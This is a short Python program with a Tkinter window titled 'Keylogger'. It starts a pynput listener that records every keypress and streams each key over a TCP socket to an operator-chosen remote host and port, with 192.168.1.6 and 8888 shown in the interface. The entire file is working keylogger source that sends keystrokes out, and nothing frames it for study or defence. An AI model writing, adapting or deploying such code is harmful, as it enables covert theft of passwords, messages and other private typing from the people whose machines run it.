import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import socket

class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger")

        self.ip_address = None
        self.port = None

        self.label_ip = tk.Label(master, text="192.168.1.6")
        self.label_ip.pack()
        self.entry_ip = tk.Entry(master)
        self.entry_ip.pack()

        self.label_port = tk.Label(master, text="8888")
        self.label_port.pack()
        self.entry_port = tk.Entry(master)
        self.entry_port.pack()

        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack()

        self.listener = None
        self.client_socket = None

    def start_keylogger(self):
        self.ip_address = self.entry_ip.get()
        self.port = int(self.entry_port.get())

        if not self.ip_address or not self.port:
            messagebox.showerror("Error", "Please enter IP address and port.")
            return

        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.ip_address, self.port))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to connect to server: {str(e)}")
            return

        try:
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            messagebox.showinfo("Keylogger", "Keylogger started.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start keylogger: {str(e)}")

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            messagebox.showinfo("Keylogger", "Keylogger stopped.")
        if self.client_socket:
            self.client_socket.close()

    def on_press(self, key):
        try:
            self.client_socket.sendall(str(key).encode("utf-8"))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send data: {str(e)}")
            self.stop_keylogger()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
